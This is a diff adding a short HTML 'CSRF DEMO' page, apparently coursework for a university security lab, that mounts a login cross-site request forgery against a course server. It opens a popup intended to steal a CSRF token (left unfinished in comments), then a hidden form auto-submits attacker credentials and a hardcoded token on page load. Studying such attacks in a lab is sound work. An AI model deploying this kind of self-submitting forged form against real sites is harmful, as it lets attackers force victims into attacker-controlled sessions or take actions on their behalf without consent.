@@ -1,0 +1,33 @@
+<html>
+	<head> <title> CSRF DEMO </title>
+	</head>
+	<body>
+		<script type="text/javascript">
+		var popup = window.open('csrf_11v1.html','width=10, height=8,resizable=no');
+		popup.blur();
+		window.focus();
+		//alert("Yes! This works!");
+		// NOW THE csrf_11v1 should (1.) Extract the csrf token and (2.) Place it into a text file (create it if the file isnt present!)
+
+		// HERE, I SHOULD BE READING THAT TOKEN INTO A STRING AND USE IT
+		//var fs = require("fs");
+		//var text = fs.readFileSync("./token_string.txt");
+		//alert("Hua!");
+
+		popup.close();
+		</script>
+
+		<form  name="csrf_form" method="POST" action="http://cs526-s18.cs.purdue.edu/project3/login?csrfdefense=1&xssdefense=0">
+		
+		<input type="hidden" name="username" value="attacker" />
+		<input type="hidden" name="password" value="123456" />
+		<input type="hidden" name="csrf_token" value= "f49a2096efbf4e637973b80f33f51e24" />
+		
+		<script type="text/javascript">document.csrf_form.submit();
+		</script>
+		</form>
+		<iframe name="hiddenFrame" style="display:none;"> </iframe>
+	</body>
+</html>
+
+
